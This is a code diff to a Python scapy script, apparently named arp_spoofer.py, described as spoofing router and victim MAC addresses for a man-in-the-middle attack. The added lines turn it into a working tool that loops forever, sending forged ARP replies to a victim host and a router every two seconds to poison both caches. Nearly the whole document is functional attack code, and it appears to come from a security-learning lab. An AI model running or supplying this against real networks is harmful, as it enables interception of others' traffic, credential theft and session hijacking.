@@ -3,10 +3,14 @@
 """
 | Description:
     Spoofs router and victim MAC address using MITM attack.
+| Usage:
+    $ python apr_spoofer.py
+    $ ./arp_spoofer.py
 | Version:
-    2
+    3
 | Notes:
-    
+    IndexError: list index out of range when scanning non-existant
+    IP addresses.
 | Algorithm:
      
 | Variables:
@@ -16,7 +20,7 @@
 """
 
 import scapy.all as scapy
-
+import time
 
 def get_mac(ip):
     '''
@@ -43,13 +47,14 @@ def get_mac(ip):
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     # target ip, target mac, router ip
-    packet = scapy.ARP(op=2, pdst="10.0.2.4", hwdst=target_mac, psrc="10.0.2.1")
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet)
 
 
 #--------------[ MAIN ]--------------
 
 
-router_mac = get_mac("10.0.2.1")
-print(router_mac)
-
+while True:
+    spoof("10.0.2.4", "10.0.2.1")
+    spoof("10.0.2.1", "10.0.2.4")
+    time.sleep(2)
